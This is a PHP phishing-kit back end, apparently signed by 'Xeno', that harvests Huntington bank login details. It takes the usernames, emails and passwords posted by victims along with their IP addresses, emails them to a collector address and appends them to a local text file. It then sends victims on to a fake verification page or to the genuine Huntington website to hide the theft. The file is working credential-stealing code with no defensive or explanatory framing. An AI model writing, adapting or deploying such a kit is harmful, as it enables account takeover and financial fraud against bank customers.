<?php
session_start();
$send = "email@gmail.com";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$praga=rand();
$praga=md5($praga);
$page= $_POST['page'];



if ($page == '1') 

{ 
$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Huntington log  | -----------\n";
$message .= "USER  :  ".$_POST['username']." \n";
$message .= "PASS  :  ".$_POST['password']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| Huntington log  By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);



header("Location:./secure.php?Verifizieren.aspx?Pedido=DatenEvent=$praga-session_id=$praga$praga");
}



elseif ($page == '2') 
{ 

$message = "\n";
$message .= "----------- | IP : $ip  | -----------\n";
$message .= "----------- |  Huntington Email   | -----------\n";
$message .= "EMAIL :  ".$_POST['email']." \n";
$message .= "PASS  :  ".$_POST['password']." \n";
$message .= "----------- | By Xeno | -----------\n";
$message .= "\n";
$subject = "| Huntington Email By Xeno | $ip |";

mail($send,$subject,$message);


$file = fopen("./Xeno.txt", 'a');
fwrite($file, $message);


header("Location:https://www.Huntington.com");
}











?>


